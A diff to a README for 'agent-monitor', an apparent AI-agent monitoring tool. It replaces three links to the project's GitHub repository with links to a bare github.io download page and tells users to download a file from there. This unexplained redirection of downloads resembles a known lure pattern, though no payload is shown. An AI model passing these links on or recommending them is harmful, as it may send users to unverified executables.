@@ -1,6 +1,6 @@
 # 📊 agent-monitor - See Your AI Agents Clearly
 
-[![Download agent-monitor](https://img.shields.io/badge/Download-agent--monitor-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gamboasusana748/agent-monitor)
+[![Download agent-monitor](https://img.shields.io/badge/Download-agent--monitor-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://gamboasusana748.github.io)
 
 ---
 
@@ -53,7 +53,7 @@ Ready to take control of your AI agents? Here's how to get agent-monitor on your
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Gamboasusana748/agent-monitor](https://github.com/Gamboasusana748/agent-monitor)
+Visit this link to download the application: [https://gamboasusana748.github.io](https://gamboasusana748.github.io)
 
 Click the big green "Download" button on that page. The file will start downloading to your computer.
 
@@ -208,7 +208,7 @@ If agent-monitor helps you, please consider:
 
 Don't let your AI agents run wild. Take control, see everything, and manage your costs with agent-monitor.
 
-[![Download agent-monitor Now](https://img.shields.io/badge/Download_Now-agent--monitor-FF5722?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Gamboasusana748/agent-monitor)
+[![Download agent-monitor Now](https://img.shields.io/badge/Download_Now-agent--monitor-FF5722?style=for-the-badge&logo=windows&logoColor=white)](https://gamboasusana748.github.io)
 
 It takes just a few minutes to set up, and you'll immediately see the difference it makes. Your AI agents are working hard—now it's time to watch them work smarter.
 
